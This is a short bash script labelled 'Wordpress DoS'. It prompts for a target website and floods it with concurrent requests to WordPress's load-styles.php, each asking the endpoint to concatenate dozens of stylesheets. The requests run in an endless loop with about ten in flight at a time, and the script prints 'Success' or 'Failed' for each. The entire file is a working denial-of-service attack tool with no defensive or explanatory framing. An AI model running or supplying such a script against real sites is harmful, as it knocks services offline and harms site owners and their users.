#!/bin/bash
# Wordpress DoS
echo "Input Website!"
read web

function dos(){
	if [[ $(curl -kLs "${1}/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,customize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-components,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,deprecated-media,farbtastic" ) =~ 'wpadminbar' ]]; then
		printf "Success\n"
	else
		printf "Failed\n"
	fi
}

while :
do
((cthread=cthread%10)); ((cthread++==0)) && wait
	dos "${web}" &
done
